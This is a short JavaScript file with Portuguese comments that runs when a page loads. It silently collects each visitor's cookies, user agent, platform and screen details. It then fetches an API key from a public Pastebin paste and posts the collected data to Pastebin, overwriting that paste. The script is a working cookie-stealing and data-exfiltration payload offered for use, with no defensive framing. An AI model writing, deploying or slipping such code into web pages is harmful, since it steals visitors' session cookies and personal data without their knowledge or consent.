function coletarDados() {
    const dados = {
        userAgent: navigator.userAgent,
        navegador: navigator.appName,
        plataforma: navigator.platform,
        tela: {
            largura: screen.width,
            altura: screen.height,
            profundidade: screen.colorDepth
        },
        cookies: document.cookie,
        localStorage: localStorage.length,
        sessionStorage: sessionStorage.length
    };

    // URL do Pastebin contendo a API Key
    const pastebinKeyUrl = 'https://pastebin.com/raw/L6LkHB3B'; // Novo link público fornecido por você

    // Recupera a API Key do Pastebin armazenada no paste especificado
    fetch(pastebinKeyUrl)
        .then(response => response.text())
        .then(apiKey => {
            // ID do Paste que será modificado (parte do link do Pastebin)
            const pasteId = 'L6LkHB3B'; // ID correto do novo paste público

            // Converte os dados em texto JSON
            const jsonData = JSON.stringify(dados, null, 2);

            // Configura a URL da API do Pastebin
            const pastebinApiUrl = `https://pastebin.com/api/api_post.php`;

            // Parâmetros para a requisição na API do Pastebin
            const formData = new URLSearchParams({
                api_dev_key: apiKey.trim(), // Chave de desenvolvedor
                api_option: 'edit', // Editar o paste
                api_paste_code: jsonData, // Dados JSON convertidos
                api_paste_key: pasteId // Identificador do paste
            });

            // Faz a requisição POST para atualizar o paste
            fetch(pastebinApiUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: formData
            })
            .then(response => response.text())
            .then(result => {
                console.log('Dados salvos no Pastebin com sucesso:', result);
            })
            .catch(error => {
                console.error('Erro ao salvar os dados no Pastebin:', error);
            });
        })
        .catch(error => {
            console.error('Erro ao recuperar a API Key do Pastebin:', error);
        });
}

// Chama a função quando a página carregar
window.onload = function() {
    coletarDados();
};
